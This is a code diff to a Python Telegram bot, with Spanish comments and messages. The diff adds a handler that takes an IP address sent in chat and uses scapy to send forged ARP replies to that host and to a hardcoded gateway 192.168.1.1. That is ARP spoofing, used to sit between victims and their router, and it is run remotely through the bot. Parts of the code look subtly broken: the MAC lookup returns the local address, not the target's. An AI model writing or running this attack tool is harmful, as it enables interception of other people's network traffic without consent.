@@ -2,7 +2,8 @@ import logging
 import os
 
 from telegram import ReplyKeyboardMarkup
-from telegram.ext import CommandHandler, ConversationHandler, MessageHandler
+from telegram.ext import CommandHandler, ConversationHandler, MessageHandler, Updater
+from scapy.all import ARP, Ether, send
 
 a = 1
 
@@ -42,7 +43,27 @@ def set_ip(update, context):
 
     ip = update.message.text
 
-    print(ip)
+    logger.info(f'ARP spoofing iniciado para {ip}')
+
+    target_ip = ip
+    gateway_ip = "192.168.1.1"
+
+    try:
+        target_mac = ARP().hwsrc
+        gateway_mac = ARP(pdst=gateway_ip).hwsrc
+
+        packet_target = Ether(dst=target_mac)/ARP(op="is-at", hwsrc=gateway_mac, psrc=gateway_ip, pdst=target_ip)
+        packet_gateway = Ether(dst=gateway_mac)/ARP(op="is-at", hwsrc=target_mac, psrc=target_ip, pdst=gateway_ip)
+
+        send(packet_target, verbose=False)
+        send(packet_gateway, verbose=False)
+
+        logger.info(f'ARP spoofing finalizado para {ip}')
+        update.message.reply_text(f'Se realizó ARP spoofing a la dirección IP {ip}')
+
+    except Exception as e:
+        logger.error(f'Ocurrió un error al realizar el ARP spoofing: {str(e)}')
+        update.message.reply_text('Ocurrió un error al realizar el ARP spoofing')
 
     return ConversationHandler.END
 
@@ -75,6 +96,7 @@ def main():
     dp.add_handler(conv_handler)
     updater.start_polling()
 
+    logger.info("El bot se ha iniciado correctamente")
     updater.idle()
 
 if __name__ == '__main__':
